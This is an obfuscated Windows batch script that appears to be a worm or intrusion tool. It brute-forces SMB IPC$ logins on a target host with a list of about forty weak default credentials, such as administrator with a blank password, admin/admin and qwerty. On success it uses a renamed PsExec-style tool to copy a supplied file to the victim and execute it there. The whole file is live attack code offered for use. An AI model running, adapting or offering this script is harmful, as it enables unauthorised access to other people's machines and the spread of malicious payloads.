@echo off
SeT D=u
SeT E=s
SeT F=e
SeT Co=ERRORLEVEL
SeT Ne=net
SeT liker=titlex
SeT litk=goto
%Ne% %D%%E%%F% \\%1\IPC$ "xxyyzz" /user:administrator
if nOt %Co% 1 %litk% Xeli29
%Ne% %D%%E%%F% \\%1\IPC$ "abc" /user:administrator
if nOt %Co% 1 %litk% Xeli30
%Ne% %D%%E%%F% \\%1\IPC$ "student" /user:student
if nOt %Co% 1 %litk% Xeli31
%Ne% %D%%E%%F% \\%1\IPC$ "teacher" /user:teacher
if nOt %Co% 1 %litk% Xeli32
%Ne% %D%%E%%F% \\%1\IPC$ "" /user:user
if nOt %Co% 1 %litk% Xeli33
%Ne% %D%%E%%F% \\%1\IPC$ "user" /user:user
if nOt %Co% 1 %litk% Xeli34
%Ne% %D%%E%%F% \\%1\IPC$ "test" /user:test
if nOt %Co% 1 %litk% Xeli4
%Ne% %D%%E%%F% \\%1\IPC$ "test123" /user:administrator
if nOt %Co% 1 %litk% Xeli5
%Ne% %D%%E%%F% \\%1\IPC$ "1" /user:administrator
if nOt %Co% 1 %litk% Xeli26
%Ne% %D%%E%%F% \\%1\IPC$ "123" /user:administrator
if nOt %Co% 1 %litk% Xeli27
%Ne% %D%%E%%F% \\%1\IPC$ "12345" /user:admin
if nOt %Co% 1 %litk% Xeli28
%Ne% %D%%E%%F% \\%1\IPC$ "temp" /user:administrator
if nOt %Co% 1 %litk% Xeli6
%Ne% %D%%E%%F% \\%1\IPC$ "" /user:administrator
if nOt %Co% 1 %litk% Xeli1
%Ne% %D%%E%%F% \\%1\IPC$ "" /user:administrator
if nOt %Co% 1 %litk% Xeli35
%Ne% %D%%E%%F% \\%1\IPC$ "Administrator" /user:administrator
if nOt %Co% 1 %litk% Xeli2
%Ne% %D%%E%%F% \\%1\IPC$ "Administrator" /user:administrator
if nOt %Co% 1 %litk% Xeli37
%Ne% %D%%E%%F% \\%1\IPC$ "test" /user:administrator
if nOt %Co% 1 %litk% Xeli3
%Ne% %D%%E%%F% \\%1\IPC$ "admin" /user:administrator
if nOt %Co% 1 %litk% Xeli10
%Ne% %D%%E%%F% \\%1\IPC$ "temp123" /user:administrator
if nOt %Co% 1 %litk% Xeli7
%Ne% %D%%E%%F% \\%1\IPC$ "pass" /user:administrator
if nOt %Co% 1 %litk% Xeli8
%Ne% %D%%E%%F% \\%1\IPC$ "password" /user:administrator
if nOt %Co% 1 %litk% Xeli9
%Ne% %D%%E%%F% \\%1\IPC$ "root" /user:root
if nOt %Co% 1 %litk% Xeli11
%Ne% %D%%E%%F% \\%1\IPC$ "changeme" /user:administrator
if nOt %Co% 1 %litk% Xeli12
%Ne% %D%%E%%F% \\%1\IPC$ "admin" /user:admin
if nOt %Co% 1 %litk% Xeli13
%Ne% %D%%E%%F% \\%1\IPC$ "123456" /user:administrator
if nOt %Co% 1 %litk% Xeli14
%Ne% %D%%E%%F% \\%1\IPC$ "654321" /user:administrator
if nOt %Co% 1 %litk% Xeli15
%Ne% %D%%E%%F% \\%1\IPC$ "abc123" /user:administrator
if nOt %Co% 1 %litk% Xeli16
%Ne% %D%%E%%F% \\%1\IPC$ "12345" /user:administrator
if nOt %Co% 1 %litk% Xeli36
%Ne% %D%%E%%F% \\%1\IPC$ "red123" /user:administrator
if nOt %Co% 1 %litk% Xeli17
%Ne% %D%%E%%F% \\%1\IPC$ "admin123" /user:administrator
if nOt %Co% 1 %litk% Xeli18
%Ne% %D%%E%%F% \\%1\IPC$ "qwerty" /user:administrator
if nOt %Co% 1 %litk% Xeli19
%Ne% %D%%E%%F% \\%1\IPC$ "asdf" /user:administrator
if nOt %Co% 1 %litk% Xeli20
%Ne% %D%%E%%F% \\%1\IPC$ "password123" /user:administrator
if nOt %Co% 1 %litk% Xeli21
%Ne% %D%%E%%F% \\%1\IPC$ "secret" /user:administrator
if nOt %Co% 1 %litk% Xeli22
%Ne% %D%%E%%F% \\%1\IPC$ "qwertyuiop" /user:administrator
if nOt %Co% 1 %litk% Xeli23
%Ne% %D%%E%%F% \\%1\IPC$ "12345" /user:administrator
if nOt %Co% 1 %litk% Xeli24
%Ne% %D%%E%%F% \\%1\IPC$ "54321" /user:administrator
if nOt %Co% 1 %litk% Xeli25
%litk% raide
:Xeli1
%liker% \\%1 -u administrator -p "" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "" -d %2 -o
%litk% raide
:Xeli10
%liker% \\%1 -u administrator -p "admin" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "admin" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "admin" -d %2 -o
%litk% raide
:Xeli2
%liker% \\%1 -u administrator -p "administrator" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "administrator" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "administrator" -d %2 -o
%litk% raide
:Xeli37
%liker% \\%1 -u administrator -p "Administrator" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "Administrator" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "Administrator" -d %2 -o
%litk% raide
:Xeli11
%liker% \\%1 -u root -p "root" -d attrib.exe -r %2
%liker% \\%1 -u root -p "root" -f -c -d %2 -o
%liker% \\%1 -u root -p "root" -d %2 -o
%litk% raide
:Xeli13
%liker% \\%1 -u admin -p "admin" -d attrib.exe -r %2
%liker% \\%1 -u admin -p "admin" -f -c -d %2 -o
%liker% \\%1 -u admin -p "admin" -d %2 -o
%litk% raide
:Xeli3
%liker% \\%1 -u administrator -p "test" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "test" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "test" -d %2 -o
%litk% raide
:Xeli4
%liker% \\%1 -u test -p "test" -d attrib.exe -r %2
%liker% \\%1 -u test -p "test" -f -c -d %2 -o
%liker% \\%1 -u test -p "test" -d %2 -o
%litk% raide
:Xeli5
%liker% \\%1 -u administrator -p "test123" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "test123" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "test123" -d %2 -o
%litk% raide
:Xeli6
%liker% \\%1 -u administrator -p "temp" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "temp" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "temp" -d %2 -o
%litk% raide
:Xeli7
%liker% \\%1 -u administrator -p "temp123" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "temp123" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "temp123" -d %2 -o
%litk% raide
:Xeli8
%liker% \\%1 -u administrator -p "pass" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "pass" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "pass" -d %2 -o
%litk% raide
:Xeli9
%liker% \\%1 -u administrator -p "password" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "password" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "password" -d %2 -o
%litk% raide
:Xeli12
%liker% \\%1 -u administrator -p "changeme" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "changeme" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "changeme" -d %2 -o
%litk% raide
:Xeli14
%liker% \\%1 -u administrator -p "123456" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "123456" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "123456" -d %2 -o
%litk% raide
:Xeli15
%liker% \\%1 -u administrator -p "654321" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "654321" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "654321" -d %2 -o
%litk% raide
:Xeli16
%liker% \\%1 -u administrator -p "abc123" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "abc123" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "abc123" -d %2 -o
%litk% raide
:Xeli17
%liker% \\%1 -u administrator -p "red123" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "red123" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "red123" -d %2 -o
%litk% raide
:Xeli18
%liker% \\%1 -u administrator -p "admin123" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "admin123" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "admin123" -d %2 -o
%litk% raide
:Xeli19
%liker% \\%1 -u administrator -p "qwerty" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "qwerty" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "qwerty" -d %2 -o
%litk% raide
:Xeli20
%liker% \\%1 -u administrator -p "asdf" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "asdf" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "asdf" -d %2 -o
%litk% raide
:Xeli21
%liker% \\%1 -u administrator -p "password123" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "password123" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "password123" -d %2 -o
%litk% raide
:Xeli22
%liker% \\%1 -u administrator -p "secret" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "secret" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "secret" -d %2 -o
%litk% raide
:Xeli23
%liker% \\%1 -u administrator -p "qwertyuiop" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "qwertyuiop" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "qwertyuiop" -d %2 -o
%litk% raide
:Xeli24
%liker% \\%1 -u administrator -p "12345" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "12345" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "12345" -d %2 -o
%litk% raide
:Xeli25
%liker% \\%1 -u administrator -p "54321" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "54321" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "54321" -d %2 -o
%litk% raide
:Xeli26
%liker% \\%1 -u administrator -p "1" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "1" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "1" -d %2 -o
%litk% raide
:Xeli27
%liker% \\%1 -u administrator -p "123" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "123" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "123" -d %2 -o
%litk% raide
:Xeli28
%liker% \\%1 -u admin -p "12345" -d attrib.exe -r %2
%liker% \\%1 -u admin -p "12345" -f -c -d %2 -o
%liker% \\%1 -u admin -p "12345" -d %2 -o
%litk% raide
:Xeli29
%liker% \\%1 -u administrator -p "xxyyzz" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "xxyyzz" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "xxyyzz" -d %2 -o
%litk% raide
:Xeli30
%liker% \\%1 -u administrator -p "abc" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "abc" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "abc" -d %2 -o
%litk% raide
:Xeli31
%liker% \\%1 -u student -p "student" -d attrib.exe -r %2
%liker% \\%1 -u student -p "student" -f -c -d %2 -o
%liker% \\%1 -u student -p "student" -d %2 -o
%litk% raide
:Xeli32
%liker% \\%1 -u teacher -p "teacher" -d attrib.exe -r %2
%liker% \\%1 -u teacher -p "teacher" -f -c -d %2 -o
%liker% \\%1 -u teacher -p "teacher" -d %2 -o
%litk% raide
:Xeli33
%liker% \\%1 -u user -p "" -d attrib.exe -r %2
%liker% \\%1 -u user -p "" -f -c -d %2 -o
%liker% \\%1 -u user -p "" -d %2 -o
%litk% raide
:Xeli34
%liker% \\%1 -u user -p "user" -d attrib.exe -r %2
%liker% \\%1 -u user -p "user" -f -c -d %2 -o
%liker% \\%1 -u user -p "user" -d %2 -o
%litk% raide
:Xeli35
%liker% \\%1 -u administrator -p "" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "" -d %2 -o
%litk% raide
:Xeli36
%liker% \\%1 -u administrator -p "12345" -d attrib.exe -r %2
%liker% \\%1 -u administrator -p "12345" -f -c -d %2 -o
%liker% \\%1 -u administrator -p "12345" -d %2 -o
%litk% raide
:raide
;;;;;;;;;;;;blah;;;;;;;;;;;;;;;;
;;;;;;;;;;;;blah;;;;;;;;;;;;;;;;
;;;;;;;;;;;;blah;;;;;;;;;;;;;;;;